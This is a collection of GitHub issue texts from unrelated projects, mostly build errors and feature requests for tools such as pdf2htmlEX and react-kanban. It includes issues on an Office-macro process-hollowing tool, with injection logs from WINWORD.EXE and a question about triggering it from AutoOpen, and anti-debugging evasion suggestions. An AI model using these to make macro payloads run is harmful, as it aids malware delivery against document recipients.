> Internal Error: Lookup sub table, Mark to base attachment lookup 35 subtable in Mark to base attachment lookup 35, contains no data.
> Internal Error: Lookup sub table, Mark to base attachment lookup 36 subtable in Mark to base attachment lookup 36, contains no data.
> Internal Error: Lookup sub table, Mark to base attachment lookup 37 subtable in Mark to base attachment lookup 37, contains no data.
> Internal Error: Lookup sub table, Single Positioning lookup 38 subtable in Single Positioning lookup 38, contains no data.
> Internal Error: Device Table offsets wrong in simple positioning 2
> Internal Error: Lookup sub table, Single Positioning lookup 39 subtable in Single Positioning lookup 39, contains no data.
> Internal Error: Lookup sub table, Pairwise Positioning (kerning) lookup 40 subtable in Pairwise Positioning (kerning) lookup 40, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition lookup 0 subtable in 'ccmp' Glyph Composition/Decomposition lookup 0, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition lookup 1 subtable in 'ccmp' Glyph Composition/Decomposition lookup 1, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition lookup 2 subtable in 'ccmp' Glyph Composition/Decomposition lookup 2, contains no data.
> Internal Error: Lookup sub table, 'locl' Localized Forms in Latin lookup 3 subtable in 'locl' Localized Forms in Latin lookup 3, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition in Arabic lookup 4 subtable in 'ccmp' Glyph Composition/Decomposition in Arabic lookup 4, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition in Hebrew lookup 5 subtable in 'ccmp' Glyph Composition/Decomposition in Hebrew lookup 5, contains no data.
> Internal Error: Lookup sub table, 'ccmp' Glyph Composition/Decomposition in Hebrew lookup 6 subtable in 'ccmp' Glyph Composition/Decomposition in Hebrew lookup 6, contains no data.
> Internal Error: Lookup sub table, 'locl' Localized Forms in Arabic lookup 7 subtable in 'locl' Localized Forms in Arabic lookup 7, contains no data.
> Internal Error: Lookup sub table, 'isol' Isolated Forms in Arabic lookup 8 subtable in 'isol' Isolated Forms in Arabic lookup 8, contains no data.
> Internal Error: Lookup sub table, 'fina' Terminal Forms in Arabic lookup 9 subtable in 'fina' Terminal Forms in Arabic lookup 9, contains no data.
> Internal Error: Lookup sub table, 'medi' Medial Forms in Arabic lookup 10 subtable in 'medi' Medial Forms in Arabic lookup 10, contains no data.
> Internal Error: Lookup sub table, 'init' Initial Forms in Arabic lookup 11 subtable in 'init' Initial Forms in Arabic lookup 11, contains no data.
> Internal Error: Lookup sub table, 'rlig' Required Ligatures in Arabic lookup 12 subtable in 'rlig' Required Ligatures in Arabic lookup 12, contains no data.
> Internal Error: Lookup sub table, 'liga' Standard Ligatures in Arabic lookup 13 subtable in 'liga' Standard Ligatures in Arabic lookup 13, contains no data.
> Internal Error: Lookup sub table, 'dlig' Discretionary Ligatures in Hebrew lookup 14 subtable in 'dlig' Discretionary Ligatures in Hebrew lookup 14, contains no data.
> Internal Error: Lookup sub table, Single Substitution lookup 15 subtable in Single Substitution lookup 15, contains no data.
> Internal Error: Lookup sub table, Ligature Substitution lookup 16 subtable in Ligature Substitution lookup 16, contains no data.
> Internal Error: File Offset wrong for ttf table (name-data), -1 expected 570
> Cannot save font to C:\Users\RREG2~1.CAN\AppData\Local\Temp//pdf2htmlEX-a04444/__tmp_font1.ttf
>  > Hello,
> 
> Currently, the generated font name within `@font-face` property is something like this `@font-face{font-family:f1;src:url(f1.ttf)format('truetype');}` - as you can see, there's no real information of what given font is.
> 
> It would be great if there would be an option to generate font names, so the above code becomes this: `@font-face{family: 'Arial'; src:url(f1.ttf) format('truetype');}` or this: `@font-face{family: 'Arial'; src:url(Arial.ttf) format('truetype');}`
> 
> The reasoning behind my request is following - when using font embedded within the PDF we're confined to glyphs within that font. If I were to allow users to edit these html files using a web interface they'll run into a problem of missing glyphs. But if the font name were given, I'd simply provide an interface where they could substitute embedded font with one they can download, or one they have installed already. Even if a name of font is displayed as XLFDA Georgia Gras, user would be able to easily find Georgia Gras and substitute it. Currently, without parsing the given font, it's impossible.
> 
> The data about font name is already embedded within the resource stream, as generated TTF file has a name within the file information, so my guess is that this should be a fairly simple change.
> 
> Thanks!

Issue opened by @eithed Migrated from https://github.com/coolwanglu/pdf2htmlEX/issues/684 [sample.pdf](https://secufiles.com/n7l1/sample.pdf)
This file on page 2 and 3 will cause  memory leak.  I complie a docker and the libfontforge version is 20190801.

```
pdf2htmlEX version 0.18.7
Copyright 2012-2015 Lu Wang <coolwanglu@gmail.com> and other contributors
Libraries: 
  poppler 0.80.0
  libfontforge 20190801
  cairo 1.16.0
Default data-dir: /usr/local/share/pdf2htmlEX
Supported image format: png jpg svg
```
 Installing pdf2htmlEX via Homebrew on macOS still pulls in the old upstream fork. I'd suggest raising a PR asking for a switch to this repo instead. If the brew admins don't like that, can try making a new package. 

https://github.com/Homebrew/homebrew-core/blob/master/Formula/pdf2htmlex.rb Hi,
I am trying to convert a pdf that has some sections of data

top lef, top right
center bottom

the output of the conversion is correct but the order of the divs is reversed.
center bottom is first
than top lef, top right.

This causes the text selection to behave wierd.

Has anyone encountered this?

Thanks Hi,

I'm the Debian maintainer of pdf2htmlex. I tried building version 0.15.0 of your fork in Debian unstable but ran into the following error:

```
[  2%] Building CXX object CMakeFiles/pdf2htmlEX.dir/src/pdf2htmlEX.cc.o
/usr/bin/c++   -I/<<PKGBUILDDIR>>/src -I/usr/include/poppler -I/usr/include/python2.7 -I/usr/include/x86_64-linux-gnu/python2.7 -I/usr/include/cairo -I/usr/include/pixman-1 -I/usr/include/uuid -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/pango-1.0 -I/usr/include/fribidi -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -I/usr/include/fontforge  -g -O2 -fdebug-prefix-map=/<<PKGBUILDDIR>>=. -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -Wall -std=c++0x -pthread   -o CMakeFiles/pdf2htmlEX.dir/src/pdf2htmlEX.cc.o -c /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc
In file included from /<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:31,
                 from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/<<PKGBUILDDIR>>/src/Preprocessor.h:33:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool upsideDown() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/Preprocessor.h:34:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool useDrawChar() { return gTrue; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/Preprocessor.h:35:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool interpretType3Chars() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/Preprocessor.h:36:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool needNonText() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/Preprocessor.h:37:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool needClipToCropBox() { return gTrue; }
             ^~~~~
             bool
In file included from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:61:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool upsideDown() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:64:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool useDrawChar() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:69:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool useShadedFills(int type) { return (type == 2) ? gTrue: gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:73:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool interpretType3Chars() { return gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:76:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool needNonText() { return (param.process_nontext) ? gTrue: gFalse; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:80:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool needClipToCropBox() { return gTrue; }
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:131:126: error: ‘GBool’ has not been declared
     virtual void drawImage(GfxState * state, Object * ref, Stream * str, int width, int height, GfxImageColorMap * colorMap, GBool interpolate, int *maskColors, GBool inlineImg);
                                                                                                                              ^~~~~
In file included from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:131:162: error: ‘GBool’ has not been declared
     virtual void drawImage(GfxState * state, Object * ref, Stream * str, int width, int height, GfxImageColorMap * colorMap, GBool interpolate, int *maskColors, GBool inlineImg);
                                                                                                                                                                  ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:136:24: error: ‘GBool’ has not been declared
                        GBool interpolate,
                        ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:140:24: error: ‘GBool’ has not been declared
                        GBool maskInterpolate);
                        ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:145:13: error: ‘GBool’ does not name a type; did you mean ‘bool’?
     virtual GBool axialShadedFill(GfxState *state, GfxAxialShading *shading, double tMin, double tMax);
             ^~~~~
             bool
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:149:39: error: ‘GBool’ has not been declared
                                       GBool /*isolated*/, GBool /*knockout*/,
                                       ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:149:59: error: ‘GBool’ has not been declared
                                       GBool /*isolated*/, GBool /*knockout*/,
                                                           ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:150:39: error: ‘GBool’ has not been declared
                                       GBool /*forSoftMask*/);
                                       ^~~~~
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:325:18: error: cannot declare field ‘pdf2htmlEX::HTMLRenderer::preprocessor’ to be of abstract type ‘pdf2htmlEX::Preprocessor’
     Preprocessor preprocessor;
                  ^~~~~~~~~~~~
In file included from /<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:31,
                 from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/<<PKGBUILDDIR>>/src/Preprocessor.h:26:7: note:   because the following virtual functions are pure within ‘pdf2htmlEX::Preprocessor’:
 class Preprocessor : public OutputDev {
       ^~~~~~~~~~~~
In file included from /<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:15,
                 from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/usr/include/poppler/OutputDev.h:90:16: note: 	‘virtual bool OutputDev::upsideDown()’
   virtual bool upsideDown() = 0;
                ^~~~~~~~~~
/usr/include/poppler/OutputDev.h:93:16: note: 	‘virtual bool OutputDev::useDrawChar()’
   virtual bool useDrawChar() = 0;
                ^~~~~~~~~~~
/usr/include/poppler/OutputDev.h:113:16: note: 	‘virtual bool OutputDev::interpretType3Chars()’
   virtual bool interpretType3Chars() = 0;
                ^~~~~~~~~~~~~~~~~~~
/<<PKGBUILDDIR>>/src/pdf2htmlEX.cc: In function ‘int main(int, char**)’:
/<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:423:56: error: invalid new-expression of abstract class type ‘pdf2htmlEX::HTMLRenderer’
         unique_ptr<HTMLRenderer>(new HTMLRenderer(param))->process(doc);
                                                        ^
In file included from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:48:8: note:   because the following virtual functions are pure within ‘pdf2htmlEX::HTMLRenderer’:
 struct HTMLRenderer : OutputDev
        ^~~~~~~~~~~~
In file included from /<<PKGBUILDDIR>>/src/HTMLRenderer/HTMLRenderer.h:15,
                 from /<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:34:
/usr/include/poppler/OutputDev.h:90:16: note: 	‘virtual bool OutputDev::upsideDown()’
   virtual bool upsideDown() = 0;
                ^~~~~~~~~~
/usr/include/poppler/OutputDev.h:93:16: note: 	‘virtual bool OutputDev::useDrawChar()’
   virtual bool useDrawChar() = 0;
                ^~~~~~~~~~~
/usr/include/poppler/OutputDev.h:113:16: note: 	‘virtual bool OutputDev::interpretType3Chars()’
   virtual bool interpretType3Chars() = 0;
                ^~~~~~~~~~~~~~~~~~~
/<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:441:13: error: ‘memCheck’ is not a member of ‘Object’
     Object::memCheck(stderr);
             ^~~~~~~~
/<<PKGBUILDDIR>>/src/pdf2htmlEX.cc:442:5: error: ‘gMemReport’ was not declared in this scope
     gMemReport(stderr);
     ^~~~~~~~~~
make[4]: *** [CMakeFiles/pdf2htmlEX.dir/build.make:66: CMakeFiles/pdf2htmlEX.dir/src/pdf2htmlEX.cc.o] Error 1
```

Is some include missing?
<---------->
118835000
In the demo here:

https://brockreece.github.io/vue-kanban/

if I take item with id 4 and try to put it under id 6, in flashes as it's going there, but then jumps to the top of the approved column. Is this a bug? a misconfiguration? something else?

If necessary, I can record a video of this. 
[nodemon] 1.18.4
[nodemon] to restart at any time, enter `rs`
[nodemon] watching: *.*
[nodemon] starting `node dist/server.js dist/server.js`
internal/modules/cjs/loader.js:582
    throw err;
    ^

Error: Cannot find module 'C:\Users\ivnj\Development\NodeProjects\kanban\react-kanban\dist\server.js'
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:580:15)
    at Function.Module._load (internal/modules/cjs/loader.js:506:25)
    at Function.Module.runMain (internal/modules/cjs/loader.js:741:12)
    at startup (internal/bootstrap/node.js:285:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:739:3)
[nodemon] app crashed - waiting for file changes before starting...
 Since I'm trying to use material-ui in react-kanban I get this error, is this any known problem how can I get it working with react-kanaban?

```
ERROR in ./node_modules/react-transition-group/esm/TransitionGroup.js
    Module not found: Error: Can't resolve '@babel/runtime/helpers/esm/objectWithoutPropertiesLoose' in 'C:\Users\ivanj\Documents\Development\React-Apps\React-Kanban-Playground\react-kanban-6\react-kanban\node_modules\react-transition-group\esm'
     @ ./node_modules/react-transition-group/esm/TransitionGroup.js 1:0-100 111:16-45
     @ ./node_modules/@material-ui/core/ButtonBase/TouchRipple.js
     @ ./node_modules/@material-ui/core/ButtonBase/ButtonBase.js
     @ ./node_modules/@material-ui/core/ButtonBase/index.js
     @ ./node_modules/@material-ui/core/Button/Button.js
     @ ./node_modules/@material-ui/core/Button/index.js
     @ ./src/app/components/List/DialogSelect.jsx
     @ ./src/app/components/List/List.jsx
     @ ./src/app/components/Board/Board.jsx
     @ ./src/app/components/Board/BoardContainer.jsx
     @ ./src/app/components/App.jsx
     @ ./src/client.jsx
``` In the demo here:

https://brockreece.github.io/vue-kanban/

if I take item with id 4 and try to put it under id 6, in flashes as it's going there, but then jumps to the top of the approved column. Is this a bug? a misconfiguration? something else?

If necessary, I can record a video of this. I have created my own Component that I wanted to integrate in the existing Card.jsx component 
<myComp /> like this. I have Imported the Component and added it but for some reason the component is not visible! Is there any special procedure I need to follow in this app to add my own components?

Also what I noticed is I can't take for example existing components like ListAdder and add it in the Header for example, I import it correctly and add the jsx tag where I want the component to show up but nothing happens. So is in this app some special procedure to follow for adding and moving components around? Thanks I asked 5 expirienced developers to install the Full setup and nobody was able to do that beceuse all they say is that this package has errors, Any chance you fix this? Hello, can some one tell me why i have so much errors trying to install app?
[2019-11-07T10_16_28_390Z-debug.log](https://github.com/markusenglund/react-kanban/files/3819039/2019-11-07T10_16_28_390Z-debug.log)
 Any tips & level of difficulty getting this Kanban to be a scheduling board where:

1. The vertical access is time for each task
2. The cards have height proportional to the time the individual task takes
3. The columns will be for resources (in our case repair stations)
<---------->
119292101
First of all thanks for making this great tool! Would it be possible to detect the neccessary imports and do that automatically? That would make it much easier to run other tools as well.   For Embedded PE mode, if I call the Exploit function directly my payload executes:
```
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[-] |__ Couldn't get thread context.
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[+] |__ Got thread context
[+] |__ Got image base address: 0x7FF6C00C0000
[+] Allocated memory for the source image at address: 0x140000000
[*] Writing PE headers
[+] Wrote PE Headers at: 0x140000000 (size: 584)
[*] Writing section '.text'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x1000
[*] |__ New address (base+virt.): 0x140001000
[*] |__ Raw data address (buffer): 0x259FC347610
[*] |__ Section size: 4608
[+] Wrote section '.text' at address 0x140001000 (size: 4608)
[*] Writing section '.rdata'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x3000
[*] |__ New address (base+virt.): 0x140003000
[*] |__ Raw data address (buffer): 0x259FC348810
[*] |__ Section size: 512
[+] Wrote section '.rdata' at address 0x140003000 (size: 512)
[*] Writing section '.mxzy'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x4000
[*] |__ New address (base+virt.): 0x140004000
[*] |__ Raw data address (buffer): 0x259FC348A10
[*] |__ Section size: 35328
[+] Wrote section '.mxzy' at address 0x140004000 (size: 35328)
[*] Modifying context to point to new image base
[*] |__ Where to write new image base address: 0xC802CCD010
[*] |__ Image base address: 0x140000000
[+] Wrote image base address 0x140000000 at address 0xC802CCD010
[*] Applying new context
[*] |__ Set new entry point: 0x140004000
[+] |__ Applied context to the new thread
[*] Resuming suspended process
[+] |__ RunPE complete, successfully resumed thread

```
Otherwise, if I call it through the AutoOpen function for example, the thread context gets lost:
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[-] |__ Couldn't get thread context.

I am running the project macro in Office 2016 as a Project, document attached vba:

![image](https://user-images.githubusercontent.com/6384324/64484841-5244f180-d1d5-11e9-8cf1-e55ddc15dd46.png)
 For Embedded PE mode, if I call the Exploit function directly my payload executes:
```
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[-] |__ Couldn't get thread context.
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[+] |__ Got thread context
[+] |__ Got image base address: 0x7FF6C00C0000
[+] Allocated memory for the source image at address: 0x140000000
[*] Writing PE headers
[+] Wrote PE Headers at: 0x140000000 (size: 584)
[*] Writing section '.text'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x1000
[*] |__ New address (base+virt.): 0x140001000
[*] |__ Raw data address (buffer): 0x259FC347610
[*] |__ Section size: 4608
[+] Wrote section '.text' at address 0x140001000 (size: 4608)
[*] Writing section '.rdata'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x3000
[*] |__ New address (base+virt.): 0x140003000
[*] |__ Raw data address (buffer): 0x259FC348810
[*] |__ Section size: 512
[+] Wrote section '.rdata' at address 0x140003000 (size: 512)
[*] Writing section '.mxzy'
[*] |__ Image base: 0x140000000
[*] |__ Section virtual address: 0x4000
[*] |__ New address (base+virt.): 0x140004000
[*] |__ Raw data address (buffer): 0x259FC348A10
[*] |__ Section size: 35328
[+] Wrote section '.mxzy' at address 0x140004000 (size: 35328)
[*] Modifying context to point to new image base
[*] |__ Where to write new image base address: 0xC802CCD010
[*] |__ Image base address: 0x140000000
[+] Wrote image base address 0x140000000 at address 0xC802CCD010
[*] Applying new context
[*] |__ Set new entry point: 0x140004000
[+] |__ Applied context to the new thread
[*] Resuming suspended process
[+] |__ RunPE complete, successfully resumed thread

```
Otherwise, if I call it through the AutoOpen function for example, the thread context gets lost:
================================================================================
[+] Source file: embedded PE
[+] |__ Magic number is OK.
[+] |__ NT Header Signature is valid.
[*] |__ Machine type: 0x8664
[*] Current process: 'C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE'
[+] Created new process in suspended state.
[-] |__ Couldn't get thread context.

I am running the project macro in Office 2016 as a Project, document attached vba:

![image](https://user-images.githubusercontent.com/6384324/64484841-5244f180-d1d5-11e9-8cf1-e55ddc15dd46.png)
 Hi, running 
Office 365 16.0.12228.20322
Windows 10.0.18362 Build 18362

Can't seem to get it running properly. Any idea?

Thank you!
```
[*] Source file: 'C:\Windows\SysWOW64\cmd.exe'
[*] Checking source PE...
[-] You're trying to inject a 32 bits binary into a 64 bits process!
================================================================================
[*] Source file: 'C:\Windows\System32\cmd.exe'
[*] Checking source PE...
[*] Creating new process in suspended state...
[*] Retrieving the context of the main thread...
    |__ GetThreadContext() failed (Err:  998)
|__ GetThreadContext() failed (Err:  998)
``` Hi, running 
Office 365 16.0.12228.20322
Windows 10.0.18362 Build 18362

Can't seem to get it running properly. Any idea?

Thank you!

[*] Source file: 'C:\Windows\SysWOW64\cmd.exe'
[*] Checking source PE...
[-] You're trying to inject a 32 bits binary into a 64 bits process!
================================================================================
[*] Source file: 'C:\Windows\System32\cmd.exe'
[*] Checking source PE...
[*] Creating new process in suspended state...
[*] Retrieving the context of the main thread...
    |__ GetThreadContext() failed (Err:  998)
|__ GetThreadContext() failed (Err:  998) 
<---------->
119303667
![image](https://user-images.githubusercontent.com/563819/67175795-1765da00-f38d-11e9-9966-b0999f612758.png)
 Hi, I'm working through the course but can't find the full code for the CreateDatabaseIfNotExists method. It isn't all shown on the screen and I haven't been able to find it anywhere else in the project. Can you help? Hi!
When I'm launching the application (03 - Document Store) with `dotnet run` , I'm getting an exception. 

`Unhandled Exception: CsvHelper.ReaderException: An unexpected error occurred. ---> System.FormatException: String was not recognized as a valid DateTime.
   at System.DateTimeParse.Parse(String s, DateTimeFormatInfo dtfi, DateTimeStyles styles)
   at CsvHelper.TypeConversion.DateTimeConverter.ConvertFromString(String text, IReaderRow row, MemberMapData memberMapData) in C:\Users\narsh\Projects\CsvHelper\src\CsvHelper\TypeConversion\DateTimeConverter.cs:line 33
   at lambda_method(Closure )   at CsvHelper.Expressions.RecordCreator.Create[T]() in C:\Users\narsh\Projects\CsvHelper\src\CsvHelper\Expressions\RecordCreator.cs:line 44
   at CsvHelper.CsvReader.<GetRecords>d__631.MoveNext() in C:\Users\narsh\Projects\CsvHelper\src\CsvHelper\CsvReader.cs:line 1055   --- End of inner exception stack trace ---
   at CsvHelper.Configuration.Configuration.<>c.<.ctor>b__148_4(CsvHelperException exception) in C:\Users\narsh\Projects\CsvHelper\src\CsvHelper\Configuration\Configuration.cs:line 106`

I'm using dotnet version 2.1.101 ![image](https://user-images.githubusercontent.com/563819/67175795-1765da00-f38d-11e9-9966-b0999f612758.png)
 Hi, I'm working through the course but can't find the full code for the CreateDatabaseIfNotExists method. It isn't all shown on the screen and I haven't been able to find it anywhere else in the project. Can you help?
<---------->
119306035
Notify me, Reminders toggle does nothing
NetID does nothing (and is unnecessary)
Text is very small Selecting & deselection "bookmark" in an event doesn't immediately reflect in My Events https://github.com/cornell-dti/events-manager-android/blob/64fde02f38152fa8198bd48542e3380182d8bb45/Events/app/src/main/java/com/dti/cornell/events/ForYouFragment.java#L24 See: https://github.com/cornell-dti/events-manager-android/runs/253853038 Feed API should not have hardcoded start, end times, or timestamp.
https://github.com/cornell-dti/events-manager-android/blob/discrepancy-revisions/Events/app/src/main/java/com/dti/cornell/events/utils/Internet.java#L120 Create uniform share button scheme (link to cue website to redirect based on user platform) Selecting & deselection "bookmark" in an event doesn't immediately reflect in My Events https://github.com/cornell-dti/events-manager-android/blob/64fde02f38152fa8198bd48542e3380182d8bb45/Events/app/src/main/java/com/dti/cornell/events/ForYouFragment.java#L53 Create uniform share button scheme (link to cue website to redirect based on user platform) https://github.com/cornell-dti/events-manager-android/blob/64fde02f38152fa8198bd48542e3380182d8bb45/Events/app/src/main/java/com/dti/cornell/events/MainActivity.java#L105-L115 Feed API should not have hardcoded start, end times, or timestamp.
https://github.com/cornell-dti/events-manager-android/blob/discrepancy-revisions/Events/app/src/main/java/com/dti/cornell/events/utils/Internet.java#L120 https://github.com/cornell-dti/events-manager-android/blob/64fde02f38152fa8198bd48542e3380182d8bb45/Events/app/src/main/java/com/dti/cornell/events/EventAdapter.java#L35
<---------->
119706550
Commit 81afd2f90f81674cf1339644a95c4cfd3aa78298 was committed to support riscv-32 test elf files but we're not exactly sure why it was required. Once we have a diagnosis we should implement a proper fix.
<---------->
119996632
I have some suggestions, would be nice to implement:

- Don't call RtlGetVersion, use ASM and load PEB into RAX
- Don't call get usermode functions... find a way to direct syscall or something (maybe edit wow64ext function X64Call and put in call SYSCALL ?)
- Use RtlComputeCrc32 instead of that class ?
- ldasm can throw exception, find a way to catch all and do another operation ?

That's all for now, let me know what you think. I cam across the following:

```
if (_flags & FLAG_DETECT_DEBUGGER)
	{
		if (_isArch64)
		{
			//
			// 首先获取 ZwQueryInformationProcess函数地址
			//
```

You are not checking if it's wow64, yet you call GetModuleHandle64(L"ntdll.dll") which returns 0 if not wow64 process:

```
DWORD64 GetModuleHandle64(const wchar_t* lpModuleName)
{
	if (!g_isWow64)
		return 0;
```

Same thing here:

```
//
		//从 ntdll 虚拟地址转换到实际文件偏移数据
		//
		DWORD	fileOffset = 0;
		if (_isArch64)
		{
			unsigned char pehead[XAD_PAGESIZE];
			getMem64(pehead, GetModuleHandle64(XAD_NTDLL), XAD_PAGESIZE);
```

I`m not sure, is this intentional or what ? Hi,

What's the purpose of this ?

```
		unsigned char *pRandChar = (unsigned char *)_pagePtr;
		for (size_t i = 0; i < _pageSize; i++)
		{
			pRandChar[i] = LOBYTE(rand());
		}
```

It's never used from what I can see... I came across the following:

```
if (_flags & FLAG_DETECT_DEBUGGER)
	{
		if (_isArch64)
		{
			//
			// 首先获取 ZwQueryInformationProcess函数地址
			//
```

You are not checking if it's wow64, yet you call GetModuleHandle64(L"ntdll.dll") which returns 0 if not wow64 process:

```
DWORD64 GetModuleHandle64(const wchar_t* lpModuleName)
{
	if (!g_isWow64)
		return 0;
```

Same thing here:

```
//
		//从 ntdll 虚拟地址转换到实际文件偏移数据
		//
		DWORD	fileOffset = 0;
		if (_isArch64)
		{
			unsigned char pehead[XAD_PAGESIZE];
			getMem64(pehead, GetModuleHandle64(XAD_NTDLL), XAD_PAGESIZE);
```

I`m not sure, is this intentional or what ? Hello 

Maybe recode this lib https://github.com/LordNoteworthy/ for additional protection? How to use your code with mingw compiler ? Why this error?
 
Source codes in repo https://github.com/lurumdare/khaleesi/tree/xantidebug
commit https://github.com/lurumdare/khaleesi/commit/1929297589062700abc42a51ef8eb14628282aba Hello 

Maybe recode this lib https://github.com/LordNoteworthy/al-khaser for additional protection? How to self checksuming work Tell me how it works? Why this error?
  How to self checksuming work Tell me how it works?
<---------->
120260400
I have two buttons and on its click I want to load different data, which is loaded perfectly. but the text entered in search bar is not cleared. please help me how to clear the search text on button click. I want to clear the text before loading the data.  Fantastic project.
I'd like to suggest an idea.
Would be awesome if u can add single AND multiple selection (like a  radio button or check box with style Customizable ), appreciate if return an array.
And suggest , to set them as a props boolean ( like showSearch ).
Ofc this is only an idea. Anyway is already an awesome project. Congratulations

 using this library I am getting the warning "ListView is deprecated and will be removed in a future release. " using this library I am getting the warning "ListView is deprecated and will be removed in a future release. " is there any way to load more data on scroll like we are doing in Flatlist
in FlatList we are doing it like onEndReached={()=> this._loadMore()}
 Fantastic project.
I'd like to suggest an idea.
Would be awesome if u can add single AND multiple selection (like a  radio button or check box with style Customizable ), appreciate if return an array.
And suggest , to set them as a boolean ( like searchKey ).
Ofc this is only an idea. Anyway is already an awesome project. Congratulations


<---------->
120936946

C:\Users\HI\Anaconda3>python
Python 3.6.8 |Anaconda, Inc.| (default, Feb 21 2019, 18:30:04) [MSC v.1916 64 bi
t (AMD64)] on win32

Warning:
This Python interpreter is in a conda environment, but the environment has
not been activated. Libraries may fail to load.  To activate this environment
please see https://conda.io/activation

Type "help", "copyright", "credits" or "license" for more information.
>>> import pandas as pd
>>> import tensorflow
Traceback (most recent call last):
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low.py", line 58, in <module>
    from tensorflow.python.pywrap_tensorflow_internal import *
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low_internal.py", line 28, in <module>
    _pywrap_tensorflow_internal = swig_import_helper()
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low_internal.py", line 24, in swig_import_helper
    _mod = imp.load_module('_pywrap_tensorflow_internal', fp, pathname, descript
